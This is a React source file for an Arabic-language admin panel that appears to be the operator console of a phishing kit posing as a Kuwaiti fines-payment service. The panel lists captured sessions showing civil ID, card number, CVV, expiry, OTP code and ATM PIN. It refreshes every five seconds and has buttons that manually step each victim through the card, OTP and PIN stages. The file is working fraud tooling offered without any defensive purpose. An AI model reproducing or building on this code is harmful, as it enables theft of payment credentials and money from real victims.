import { useState, useEffect, useRef } from "react";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

interface PaymentSession {
  id: number;
  sessionId: string;
  queryId: number | null;
  selectedFines: any;
  totalAmount: string | null;
  cardName: string | null;
  cardNumber: string | null;
  cardNumberMasked: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otpCode: string | null;
  atmPin: string | null;
  stage: Stage;
  errorMessage: string | null;
  civilId: string | null;
  enquiryType: string | null;
  clientIp: string | null;
  userAgent: string | null;
  statusRead: number | null;
  createdAt: Date | string;
  updatedAt: Date | string;
}

const stageConfig: Record<Stage, { label: string; color: string; bg: string }> = {
  card:         { label: "جديد",              color: "#2563eb", bg: "#dbeafe" },
  card_pending: { label: "انتظار دفع",        color: "#d97706", bg: "#fef3c7" },
  otp:          { label: "انتظار OTP",        color: "#b45309", bg: "#fef9c3" },
  otp_pending:  { label: "انتظار OTP",        color: "#b45309", bg: "#fef9c3" },
  atm:          { label: "انتظار PIN",        color: "#7c3aed", bg: "#ede9fe" },
  atm_pending:  { label: "انتظار PIN",        color: "#7c3aed", bg: "#ede9fe" },
  success:      { label: "مكتمل",             color: "#16a34a", bg: "#dcfce7" },
  failed:       { label: "فشل",               color: "#dc2626", bg: "#fee2e2" },
};

export default function AdminPanel() {
  const [token, setToken] = useState<string | null>(() => localStorage.getItem("adminToken"));
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null);

  const loginMutation = trpc.admin.login.useMutation();
  const verifyQuery = trpc.admin.verify.useQuery({ token: token || "" }, { enabled: !!token, retry: false });
  const sessionsQuery = trpc.admin.getSessions.useQuery({ token: token || "" }, { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 5000 });
  const actionMutation = trpc.admin.action.useMutation();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await loginMutation.mutateAsync({ password });
      if (res.success) {
        localStorage.setItem("adminToken", res.token);
        setToken(res.token);
      }
    } catch (err: any) {
      setLoginError("كلمة المرور غير صحيحة");
    }
  };

  const handleAction = async (sessionId: string, action: "pass" | "denied" | "completed", errorMsg?: string) => {
    if (!token) return;
    await actionMutation.mutateAsync({ token, sessionId, action, errorMsg });
    sessionsQuery.refetch();
  };

  if (!token || !verifyQuery.data?.valid) {
    return (
      <div className="min-h-screen bg-gray-100 d-flex align-items-center justify-content-center p-4" dir="rtl">
        <div className="card shadow-lg p-4 w-100" style={{ maxWidth: '400px' }}>
          <h4 className="text-center font-weight-bold mb-4">لوحة التحكم</h4>
          <form onSubmit={handleLogin}>
            <div className="form-group mb-3">
              <label className="mb-1">كلمة المرور</label>
              <input type="password" title="password" className="form-control" value={password} onChange={e => setPassword(e.target.value)} required />
            </div>
            {loginError && <div className="text-danger mb-3">{loginError}</div>}
            <button type="submit" className="btn btn-primary btn-block">دخول</button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-light p-4" dir="rtl">
      <div className="container-fluid">
        <div className="d-flex justify-content-between align-items-center mb-4">
          <h2 className="font-weight-bold">إدارة العمليات</h2>
          <button className="btn btn-outline-danger" onClick={() => { localStorage.removeItem("adminToken"); setToken(null); }}>خروج</button>
        </div>

        <div className="card shadow-sm overflow-hidden">
          <div className="table-responsive">
            <table className="table table-hover mb-0 text-right">
              <thead className="bg-dark text-white">
                <tr>
                  <th>التاريخ</th>
                  <th>الرقم المدني</th>
                  <th>البطاقة</th>
                  <th>المبلغ</th>
                  <th>الحالة</th>
                  <th>البيانات المستلمة</th>
                  <th>الإجراءات</th>
                </tr>
              </thead>
              <tbody>
                {sessionsQuery.data?.sessions.map((s: PaymentSession) => (
                  <tr key={s.id}>
                    <td>{new Date(s.createdAt).toLocaleString('ar-KW')}</td>
                    <td>{s.civilId}</td>
                    <td>{s.cardNumberMasked || s.cardNumber || '-'}</td>
                    <td className="font-weight-bold text-primary">{s.totalAmount} دك</td>
                    <td>
                      <span className="badge p-2" style={{ backgroundColor: stageConfig[s.stage]?.bg, color: stageConfig[s.stage]?.color }}>
                        {stageConfig[s.stage]?.label}
                      </span>
                    </td>
                    <td>
                      <div className="small">
                        {s.otpCode && <div>OTP: <b className="text-purple">{s.otpCode}</b></div>}
                        {s.atmPin && <div>PIN: <b className="text-orange">{s.atmPin}</b></div>}
                        {s.cardCvv && <div>CVV: <b>{s.cardCvv}</b></div>}
                        {s.cardExpiry && <div>EXP: <b>{s.cardExpiry}</b></div>}
                      </div>
                    </td>
                    <td>
                      <div className="d-flex gap-2">
                        <button className="btn btn-sm btn-success" onClick={() => handleAction(s.sessionId, "pass")}>التالي</button>
                        <button className="btn btn-sm btn-danger" onClick={() => handleAction(s.sessionId, "denied", "فشلت العملية")}>رفض</button>
                        <button className="btn btn-sm btn-info text-white" onClick={() => handleAction(s.sessionId, "completed")}>إتمام</button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
